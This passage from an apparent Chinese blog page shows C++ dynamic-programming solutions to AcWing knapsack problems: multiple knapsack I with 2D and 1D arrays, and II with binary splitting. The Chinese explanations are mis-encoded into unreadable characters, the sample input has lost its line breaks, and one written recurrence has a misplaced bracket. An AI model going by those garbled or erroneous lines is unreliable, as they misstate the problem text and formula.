&amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = v[i]; j &lt;= m; j++) &#123;  <span class="comment">// ä¸è¦ä»0å¼€å§‹</span></span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-4-å¤šé‡èƒŒåŒ…é—®é¢˜-I"><a href="https://www.acwing.com/problem/content/4/">AcWing 4. å¤šé‡èƒŒåŒ…é—®é¢˜ I</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ç§ç‰©å“å’Œä¸€ä¸ªå®¹é‡æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> çš„èƒŒåŒ…ã€‚</p><p>ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ç§ç‰©å“æœ€å¤šæœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">s\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span> ä»¶ï¼Œæ¯ä»¶ä½“ç§¯æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">v\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>ï¼Œä»·å€¼æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">w\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>ã€‚</p><p>æ±‚è§£å°†å“ªäº›ç‰©å“è£…å…¥èƒŒåŒ…ï¼Œå¯ä½¿ç‰©å“ä½“ç§¯æ€»å’Œä¸è¶…è¿‡èƒŒåŒ…å®¹é‡ï¼Œä¸”ä»·å€¼æ€»å’Œæœ€å¤§ã€‚<br>è¾“å‡ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•°ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>ï¼Œ</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">Nï¼ŒV</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç‰©å“ç§æ•°å’ŒèƒŒåŒ…å®¹ç§¯ã€‚</p><p>æ¥ä¸‹æ¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> è¡Œï¼Œæ¯è¡Œä¸‰ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>s</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">v\_i, w\_i, s\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ç§ç‰©å“çš„ä½“ç§¯ã€ä»·å€¼å’Œæ•°é‡ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>v</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>s</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt v\_i, w\_i, s\_i \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹</strong></p><pre><code>4 51 2 32 4 13 4 34 5 2</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>10</code></pre><h3 id="äºŒç»´dpæ•°ç»„-3">äºŒç»´dpæ•°ç»„</h3><ul><li><p>çŠ¶æ€è®¡ç®— <code>f[i][j] = max(f[i - 1][j], f[i][j - v[i] + w[i]) </code></p><ul><li><p>æŒ‰ç…§ç‰©å“ié€‰æ‹©å¤šæ¬¡è¿›è¡Œåˆ†ç±»</p></li><li><p>ç‰©å“ié€‰kæ¬¡ <code>f[i - 1][j - k*v[i]] + k*w[i], k = 0,1,.. s[i]</code></p></li><li><p>ç”±äºmaxçš„è®¡ç®—ç‰¹æ€§ï¼Œæ— æ³•åƒå®Œå…¨èƒŒåŒ…é—®é¢˜ä¸€æ ·è¿›è¡Œä¼˜åŒ–</p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN], s[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;v[i], &amp;w[i], &amp;s[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= s[i] &amp;&amp; k * v[i] &lt;= j; k++) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - k * v[i]] + k * w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸€ç»´dpæ•°ç»„">ä¸€ç»´dpæ•°ç»„</h3><p><code>f[i - 1][j - k * v[i]]</code>ä»…ç”¨åˆ°<code>i - 1</code>å±‚ä¿¡æ¯ï¼Œå¯ç”¨ä¸€ç»´dpæ•°ç»„ä¼˜åŒ–ï¼Œæ³¨æ„<mark>ä½“ç§¯ä»å¤§åˆ°å°å¾ªç¯</mark>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN], s[kN];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;v[i], &amp;w[i], &amp;s[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">0</span>; j--) &#123;  <span class="comment">// ä½“ç§¯ä»å¤§åˆ°å°å¾ªç¯</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= s[i] &amp;&amp; k * v[i] &lt;= j; k++) &#123;</span><br><span class="line">        f[j] = <span class="built_in">max</span>(f[j], f[j - k * v[i]] + k * w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-5-å¤šé‡èƒŒåŒ…é—®é¢˜-II">AcWing 5. å¤šé‡èƒŒåŒ…é—®é¢˜ II</h2><p><code>éš¾åº¦ï¼šä¸­ç­‰</code></p><p>é¢˜ç›®æè¿°åŠè¾“å…¥è¾“å‡ºä¸ä¸Šé¢˜ä¸€è‡´ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong>ï¼š</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 &lt; N â‰¤ 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>V</mi><mo>â‰¤</mo><mn>2000</mn></mrow><annotation encoding="application/x-tex">0 &lt; V â‰¤ 2000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2000</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>v</mi><mi>i</mi><mo separator="true">,</mo><mi>w</mi><mi>i</mi><mo separator="true">,</mo><mi>s</mi><mi>i</mi><mo>â‰¤</mo><mn>2000</mn></mrow><annotation encoding="application/x-tex">0 &lt; vi,wi,si â‰¤ 2000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2000</span></span></span></span></li></ul><h3 id="äºŒè¿›åˆ¶ä¼˜åŒ–">äºŒè¿›åˆ¶ä¼˜åŒ–</h3><p>è‹¥å’Œä¸Šé¢˜ä¸€æ ·ä¸è¿›è¡ŒäºŒè¿›åˆ¶ä¼˜åŒ–ï¼Œåˆ™æ—¶é—´å¤æ‚åº¦ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>V</mi><msub><mi>s</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NVs_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ï¼Œä¼šåˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>Ã—</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">4\times 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>ï¼Œè€ŒC++æ¯ç§’å¤§æ¦‚ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>8</mn></msup></mrow><annotation encoding="application/x-tex">10^8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span>æ¬¡ï¼Œæ‰€ä»¥ä¼šè¶…æ—¶ã€‚</p><p>ä½¿ç”¨äºŒè¿›åˆ¶ä¼˜åŒ–ï¼Œæ—¶é—´å¤æ‚åº¦å˜ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mi>V</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><msub><mi>s</mi><mi>i</mi></msub></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(NVlog_{s_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, å¤§æ¦‚ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.2</mn><mo>Ã—</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup></mrow><annotation encoding="application/x-tex">2.2\times 10^7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2.2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span>æ¬¡ï¼Œä¸ä¼šè¶…æ—¶ã€‚</p><p>äºŒè¿›åˆ¶ä¼˜åŒ–åè½¬åŒ–ä¸º<code>01èƒŒåŒ…</code>ï¼Œä½¿ç”¨ä¸€ç»´dpæ•°ç»„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1000</span> * <span class="number">11</span>, kM = <span class="number">2010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN], cnt;</span><br><span class="line"><span class="type">int</span> f[kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="type">int</span> a, b, s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;s);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt;= s) &#123;</span><br><span class="line">      cnt++;</span><br><span class="line">      v[cnt] = k * a;</span><br><span class="line">      w[cnt] = k * b;</span><br><span class="line">      s -= k;</span><br><span class="line">      k *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      cnt++;</span><br><span class="line">      v[cnt] = s * a;</span><br><span class="line">      w[cnt] = s * b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  n = cnt;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--) &#123;</span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span 